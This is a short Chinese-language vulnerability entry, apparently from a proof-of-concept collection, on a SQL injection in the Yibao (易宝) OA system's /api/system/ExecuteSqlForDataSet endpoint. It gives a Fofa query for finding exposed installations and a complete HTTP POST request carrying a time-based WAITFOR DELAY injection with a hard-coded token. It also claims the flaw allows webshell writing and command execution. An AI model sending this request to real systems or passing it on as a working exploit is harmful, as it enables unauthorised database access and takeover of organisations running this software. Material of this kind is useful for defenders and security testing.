# 易宝OA ExecuteSqlForDataSet SQL注入

## 漏洞描述
易宝OA ExecuteSqlForDataSet SQL注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。

## 漏洞复现
1、Fofa

app="顶讯科技-易宝OA系统"





```plain
POST /api/system/ExecuteSqlForDataSet HTTP/1.1
Host: your-ip
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36

token=zxh&sql=;WAITFOR DELAY '0:0:5'--&strParameters

```
